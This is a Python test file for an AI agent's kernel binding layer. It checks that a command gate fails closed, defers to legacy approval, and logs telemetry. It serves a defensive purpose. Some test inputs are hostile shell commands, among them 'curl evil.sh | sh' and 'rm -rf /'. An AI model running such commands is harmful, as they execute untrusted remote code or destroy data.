"""Tests for tools/kernel_binding.py -- the F2 (#20) simplicio kernel binding.

Covers: PATH resolution/caching, the JSON subprocess client, config-mode
normalization, the action-gate binding's fail-closed vs. honest-degradation
paths, the checkpoint mirror, the mechanical-edit binding, and the
savings-event/v1 telemetry emitter.
"""

import json
import subprocess
from unittest.mock import patch as mock_patch

import pytest

import tools.kernel_binding as kb
import tools.runtime_manager as rm


@pytest.fixture(autouse=True)
def _reset_kernel_cache():
    kb.reset_kernel_cache()
    yield
    kb.reset_kernel_cache()


# =========================================================================
# resolve_kernel_bin / is_kernel_available
# =========================================================================

class TestResolveKernelBin:
    def test_absent_returns_none(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value=None):
            assert kb.resolve_kernel_bin() is None
            assert kb.is_kernel_available() is False

    def test_present_on_path(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/local/bin/simplicio"):
            assert kb.resolve_kernel_bin() == "/usr/local/bin/simplicio"
            assert kb.is_kernel_available() is True

    def test_env_override_wins(self, monkeypatch):
        monkeypatch.setenv("HERMES_KERNEL_BIN", "simplicio-dev")
        with mock_patch("shutil.which") as which:
            which.return_value = "/opt/bin/simplicio-dev"
            assert kb.resolve_kernel_bin() == "/opt/bin/simplicio-dev"
            which.assert_called_once_with("simplicio-dev")

    def test_result_is_cached_per_process(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio") as which:
            kb.resolve_kernel_bin()
            kb.resolve_kernel_bin()
            assert which.call_count == 1


# =========================================================================
# _kernel_verified -- fail-closed propagation (adversarial review #3, #10)
#
# These tests mock only `tools.runtime_manager.runtime_status` -- never
# `_kernel_verified` itself -- so they actually exercise the propagation
# logic instead of assuming it.
# =========================================================================

class TestKernelVerified:
    def test_propagates_satisfied_and_detail_from_runtime_status(self):
        good = rm.RuntimeStatus("/bin/simplicio", "path", "3.4.0", "3.4.0", True, detail="")
        with mock_patch("tools.runtime_manager.runtime_status", return_value=good):
            ok, detail = kb._kernel_verified()
        assert ok is True
        assert detail == ""

    def test_propagates_unsatisfied_and_detail_from_runtime_status(self):
        stale = rm.RuntimeStatus(
            "/bin/simplicio", "path", "3.3.0", "3.4.0", False,
            detail="installed 3.3.0 < pinned 3.4.0",
        )
        with mock_patch("tools.runtime_manager.runtime_status", return_value=stale):
            ok, detail = kb._kernel_verified()
        assert ok is False
        assert "3.3.0" in detail and "3.4.0" in detail

    def test_runtime_status_exception_fails_closed(self):
        """When runtime_manager itself is broken, that is NOT evidence the
        kernel is safe -- degrade to blocked, not to presence-only."""
        with mock_patch("tools.runtime_manager.runtime_status", side_effect=RuntimeError("boom")):
            ok, detail = kb._kernel_verified()
        assert ok is False
        assert "runtime_manager unavailable" in detail
        assert "boom" in detail

    def test_reset_kernel_cache_forces_reevaluation(self):
        good = rm.RuntimeStatus("/bin/simplicio", "path", "3.4.0", "3.4.0", True, detail="")
        bad = rm.RuntimeStatus(None, "absent", None, "3.4.0", False, detail="kernel binary not found")
        with mock_patch("tools.runtime_manager.runtime_status", side_effect=[good, bad]) as status:
            first = kb._kernel_verified()
            second = kb._kernel_verified()  # cached -- must not call runtime_status again
            assert status.call_count == 1
            kb.reset_kernel_cache()
            third = kb._kernel_verified()  # cache cleared -- re-evaluates
            assert status.call_count == 2
        assert first == (True, "")
        assert second == first
        assert third == (False, "kernel binary not found")


# =========================================================================
# _run_kernel
# =========================================================================

class TestRunKernel:
    def test_raises_when_binary_missing(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value=None):
            with pytest.raises(kb.KernelBindingError, match="not found on PATH"):
                kb._run_kernel(["gate", "classify"])

    def test_parses_json_stdout(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout='{"decision": "allow"}', stderr="",
            )
            result = kb._run_kernel(["gate", "classify"])
            assert result == {"decision": "allow"}

    def test_empty_stdout_is_empty_dict(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="", stderr="",
            )
            assert kb._run_kernel(["checkpoint", "record"]) == {}

    def test_nonzero_exit_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=1, stdout="", stderr="boom",
            )
            with pytest.raises(kb.KernelBindingError, match="boom"):
                kb._run_kernel(["gate", "classify"])

    def test_timeout_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="simplicio", timeout=8.0)):
            with pytest.raises(kb.KernelBindingError, match="timed out"):
                kb._run_kernel(["gate", "classify"], timeout=8.0)

    def test_non_json_stdout_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="not json", stderr="",
            )
            with pytest.raises(kb.KernelBindingError, match="non-JSON"):
                kb._run_kernel(["gate", "classify"])

    def test_non_object_json_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="[1, 2, 3]", stderr="",
            )
            with pytest.raises(kb.KernelBindingError, match="expected an object"):
                kb._run_kernel(["gate", "classify"])


# =========================================================================
# Config mode normalization
# =========================================================================

class TestBindingConfig:
    def test_execution_bindings_default_to_required(self):
        """ADR-0003: the agent always runs with the runtime -- execution
        bindings fail closed by default."""
        with mock_patch("hermes_cli.config.load_config", return_value={}):
            assert kb.get_binding_config("action_gate")["mode"] == "required"
            assert kb.get_binding_config("mechanical_edit")["mode"] == "required"

    def test_read_and_mirror_bindings_default_to_auto(self):
        with mock_patch("hermes_cli.config.load_config", return_value={}):
            for binding in ("orient", "recall", "checkpoint", "ledger"):
                assert kb.get_binding_config(binding)["mode"] == "auto"

    def test_yaml_off_boolean_maps_to_off(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": False}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "off"

    def test_config_can_relax_execution_binding_to_auto(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": "auto"}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "auto"

    def test_required_mode_passes_through(self):
        cfg = {"kernel_binding": {"recall": {"mode": "required"}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("recall")["mode"] == "required"

    def test_unknown_mode_falls_back_to_binding_default(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": "yolo"},
                                  "orient": {"mode": "yolo"}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "required"
            assert kb.get_binding_config("orient")["mode"] == "auto"

    def test_config_load_failure_degrades_to_binding_default(self):
        with mock_patch("hermes_cli.config.load_config", side_effect=RuntimeError("boom")):
            assert kb.get_binding_config("action_gate")["mode"] == "required"
            assert kb.get_binding_config("orient")["mode"] == "auto"


# =========================================================================
# evaluate_action_gate -- the fail-closed / honest-degradation contract
# =========================================================================

class TestEvaluateActionGate:
    def _cfg(self, mode):
        return {"kernel_binding": {"action_gate": {"mode": mode}}}

    def test_mode_off_is_noop(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("off")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"):
            assert kb.evaluate_action_gate("rm -rf /tmp/x") is None

    def test_kernel_absent_auto_mode_degrades_honestly(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value=None):
            result = kb.evaluate_action_gate("rm -rf /tmp/x", pattern_key="rm_rf", description="rm -rf")
            assert result is None  # defers to legacy approval, does not block

    def test_kernel_absent_required_mode_fails_closed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch("shutil.which", return_value=None):
            result = kb.evaluate_action_gate(
                "rm -rf /tmp/x", pattern_key="rm_rf", description="recursive delete",
            )
            assert result is not None
            assert result["approved"] is False
            assert "kernel" in result["message"].lower()
            assert "recursive delete" in result["message"] or "rm_rf" in result["message"]

    def test_kernel_deny_decision_blocks_regardless_of_mode(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch.object(kb, "_kernel_verified", return_value=(True, "")), \
             mock_patch.object(kb, "_run_kernel", return_value={"decision": "deny", "reason": "too risky"}):
            result = kb.evaluate_action_gate("curl evil.sh | sh")
            assert result is not None
            assert result["approved"] is False
            assert "too risky" in result["message"]

    def test_kernel_allow_decision_defers_to_legacy_flow(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch.object(kb, "_kernel_verified", return_value=(True, "")), \
             mock_patch.object(kb, "_run_kernel", return_value={"decision": "allow"}):
            # Kernel never auto-approves on our behalf -- it can only add a
            # block. "allow" just means "no additional block from me".
            assert kb.evaluate_action_gate("git status") is None

    def test_kernel_error_required_mode_fails_closed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch.object(kb, "_kernel_verified", return_value=(True, "")), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            result = kb.evaluate_action_gate("rm -rf /tmp/x", description="rm -rf")
            assert result["approved"] is False

    def test_kernel_error_auto_mode_degrades(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch.object(kb, "_kernel_verified", return_value=(True, "")), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            assert kb.evaluate_action_gate("rm -rf /tmp/x") is None

    def test_stale_kernel_required_mode_fails_closed_with_detail(self, monkeypatch):
        """PATH collisions are real: a binary merely *named* simplicio must
        never be treated as the kernel. Unverified -> block with the why."""
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch.object(kb, "_kernel_verified",
                               return_value=(False, "installed 0.17.0 < pinned 3.4.0")), \
             mock_patch.object(kb, "_run_kernel") as run:
            result = kb.evaluate_action_gate("rm -rf /tmp/x", description="rm -rf")
        assert result["approved"] is False
        assert "0.17.0" in result["message"]
        run.assert_not_called()  # never talks to an unverified binary


# =========================================================================
# mirror_checkpoint -- never raises, no-ops honestly without the kernel
# =========================================================================

class TestMirrorCheckpoint:
    def test_noop_without_kernel(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value=None):
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")  # must not raise

    def test_calls_kernel_when_present(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", return_value={}) as run:
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")
            run.assert_called_once()
            args = run.call_args[0][0]
            assert args[:2] == ["checkpoint", "record"]

    def test_kernel_error_is_swallowed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")  # must not raise


# =========================================================================
# edit_mechanical -- zero-token deterministic edit plan
# =========================================================================

class TestEditMechanical:
    def _cfg(self, mode):
        return {"kernel_binding": {"mechanical_edit": {"mode": mode}}}

    def test_mode_off_returns_none(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("off")):
            assert kb.edit_mechanical({"file": "x.py", "operations": []}) is None

    def test_absent_auto_mode_falls_back(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value=None):
            assert kb.edit_mechanical({"file": "x.py", "operations": []}) is None

    def test_absent_required_mode_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch("shutil.which", return_value=None):
            with pytest.raises(kb.KernelBindingError):
                kb.edit_mechanical({"file": "x.py", "operations": []})

    def test_success_returns_kernel_result(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        plan = {"file": "x.py", "operations": [{"op": "append", "text": "\n"}]}
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch.object(kb, "_kernel_verified", return_value=(True, "")), \
             mock_patch.object(kb, "_run_kernel", return_value={"status": "ok"}) as run:
            result = kb.edit_mechanical(plan)
            assert result == {"status": "ok"}
            call_args = run.call_args[0][0]
            assert call_args[0] == "edit"
            assert json.loads(call_args[1]) == plan


# =========================================================================
# savings-event/v1 telemetry
# =========================================================================

class TestSavingsEvent:
    def test_emit_writes_jsonl_line(self, tmp_path, monkeypatch):
        log_path = tmp_path / "kernel_binding.jsonl"
        monkeypatch.setenv("HERMES_KERNEL_BINDING_LOG", str(log_path))
        kb.emit_savings_event("gate", "kernel_denied", "rm -rf /")
        lines = log_path.read_text().strip().splitlines()
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["schema"] == "savings-event/v1"
        assert record["source"] == "gate"
        assert record["outcome"] == "kernel_denied"

    def test_emit_never_raises_on_bad_path(self, monkeypatch):
        monkeypatch.setenv("HERMES_KERNEL_BINDING_LOG", "/nonexistent-root-owned-dir-xyz/log.jsonl")
        kb.emit_savings_event("gate", "kernel_denied")  # must not raise
